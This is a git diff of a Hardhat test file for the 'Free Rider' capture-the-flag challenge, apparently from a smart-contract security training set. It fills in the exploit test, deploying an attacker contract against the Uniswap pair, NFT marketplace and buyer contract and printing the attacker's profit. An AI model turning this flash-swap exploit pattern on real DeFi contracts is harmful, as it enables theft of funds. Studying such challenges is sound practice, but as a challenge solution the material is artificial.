@@ -1,3 +1,5 @@
+//@ts-check
+/// <reference path="../../node_modules/@nomiclabs/hardhat-ethers/src/internal/type-extensions.ts" />
 // Get compiled Uniswap v2 data
 const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
@@ -104,7 +106,18 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const FreeRiderAttackerFactory = await ethers.getContractFactory('FreeRiderAttacker', attacker);
+        const attackerContract = await FreeRiderAttackerFactory.connect(attacker).deploy(
+            this.uniswapRouter.address,
+            this.uniswapFactory.address,
+            this.uniswapPair.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address,
+        );
+        await attackerContract.attack();
+        await attackerContract.sendAllNftsToBuyer();
+        console.log((await ethers.provider.getBalance(attacker.address)).toBigInt()/BigInt(1e18));
     });
 
     after(async function () {
